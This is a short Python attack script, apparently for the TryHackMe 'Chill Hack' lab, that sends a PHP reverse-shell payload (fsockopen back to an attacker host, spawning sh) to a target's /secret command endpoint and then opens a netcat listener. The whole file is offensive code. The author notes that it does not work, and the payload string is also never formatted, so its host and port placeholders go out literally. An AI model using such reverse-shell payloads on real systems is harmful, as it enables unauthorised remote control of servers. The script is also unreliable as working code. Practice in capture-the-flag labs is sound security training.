#Made on Mar 20 2023
#Created in python3
#DOES NOT WORK. i will finish it when i have the chance
#'Chill Hack' on tryhackme

import requests as req
import sys
import os
#import socket - not in current use

FileName = sys.argv[0]
host = sys.argv[1] #our host
port = sys.argv[2] #our port
tar = sys.argv[3] #our target

def nc(): #I keep switching back and forth between using the sys and socket library. And i might go back to working with socket.
    listen = f'nc -lnvp {port}'
    os.system(listen)

def main_function(): #executes the script below to establish the shell
    print(f"starting {FileName}")
    url = f'http://{tar}/secret'
    payload = {"command": """p\hp -r '$sock=fsockopen("{host}", {port});`sh <&3 >&3 2>&3`;'"""} #ohhh boyy im dumb, I'm sending payload to the server BEFORE i make a netcat session.
    post_data = req.post(url, data=payload)

    nc()

main_function()
